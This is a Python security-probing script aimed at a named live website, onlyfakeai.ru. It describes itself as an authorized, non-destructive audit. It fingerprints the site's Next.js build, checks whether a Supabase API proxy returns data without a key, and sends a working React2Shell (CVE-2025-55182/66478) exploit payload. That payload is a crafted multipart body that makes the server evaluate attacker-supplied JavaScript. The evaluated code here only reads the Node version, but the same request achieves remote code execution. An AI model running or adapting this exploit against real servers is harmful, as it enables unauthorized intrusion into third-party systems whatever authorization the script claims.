#!/usr/bin/env python3
"""Non-destructive app-layer probes against onlyfakeai.ru (authorized audit).
No writes, no DoS, ~1 req/s. Benign JS-eval marker only (no shell, no file ops)."""
import ssl, re, json, time, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
KEY = "<publishable-key>"
BND = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"


def req(method, url, headers=None, body=None, timeout=25):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def show(tag, st, hd, body, n=600):
    print(f"\n### {tag} -> HTTP {st}")
    for k in ("content-type", "x-powered-by", "x-nextjs-cache", "x-nextjs-prerender",
              "x-nextjs-stale-time", "vary", "cache-control", "cf-cache-status",
              "sb-gateway-version", "sb-gateway-mode", "sb-error-code", "location",
              "set-cookie", "content-length"):
        v = hd.get(k) or hd.get(k.title())
        if v:
            print(f"   {k}: {v[:220]}")
    try:
        print("   body:", body.decode("utf-8", "ignore")[:n].replace("\n", " "))
    except Exception:
        print("   body(bin):", body[:80])


# 1) home + build id
st, hd, b = req("GET", BASE + "/")
show("GET /", st, hd, b, 200)
m = re.search(rb"/_next/static/([^/\"']+)/_buildManifest\.js", b)
build = m.group(1).decode() if m else None
print("   buildId:", build)

# 2) build manifest (exact rewrite destinations)
if build:
    st, hd, b = req("GET", f"{BASE}/_next/static/{build}/_buildManifest.js")
    show("buildManifest", st, hd, b, 4000)

# 3) RSC transport fingerprint (no side effects)
st, hd, b = req("GET", BASE + "/", headers={"RSC": "1", "Accept": "text/x-component"})
show("GET / RSC:1", st, hd, b, 300)

# 4) /api/supabase proxy with NO apikey/authorization  (does the proxy inject a key?)
st, hd, b = req("GET", BASE + "/api/supabase/rest/v1/profiles?select=user_id&limit=1")
show("proxy no-key profiles", st, hd, b)
st, hd, b = req("GET", BASE + "/api/supabase/rest/v1/profiles?select=user_id&limit=1",
                headers={"apikey": KEY})
show("proxy publishable-key profiles (control)", st, hd, b)
st, hd, b = req("GET", BASE + "/api/supabase/rest/v1/", headers={"apikey": KEY})
show("proxy rest root", st, hd, b)
st, hd, b = req("GET", BASE + "/api/supabase/health", headers={"apikey": KEY})
show("proxy /health", st, hd, b)

# 5) React2Shell (CVE-2025-55182/66478) benign JS-eval probe.
#    Vulnerable: our _prefix string is eval'd and NEXT_REDIRECT digest is
#    serialized back -> body contains R2S_AUDIT_PROBE_<node version>.
prefix = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest:'R2S_AUDIT_PROBE_'+res});")
payload_json = json.dumps({
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
        "_prefix": prefix,
        "_chunks": "$Q2",
        "_formData": {"get": "$1:constructor:constructor"},
    },
})
parts = []
parts.append(f"--{BND}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{payload_json}\r\n")
parts.append(f"--{BND}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n")
parts.append(f"--{BND}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n")
parts.append(f"--{BND}--\r\n")
body = "".join(parts).encode()
hdr = {
    "Next-Action": "x",
    "X-Nextjs-Request-Id": "b5dce965",
    "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    "Content-Type": f"multipart/form-data; boundary={BND}",
}
st, hd, b = req("POST", BASE + "/", headers=hdr, body=body)
show("React2Shell benign probe", st, hd, b, 1200)
txt = b.decode("utf-8", "ignore")
print("   >>> R2S marker present:", "R2S_AUDIT_PROBE_" in txt)
if "R2S_AUDIT_PROBE_" in txt:
    i = txt.find("R2S_AUDIT_PROBE_")
    print("   >>> digest excerpt:", txt[i:i + 120])
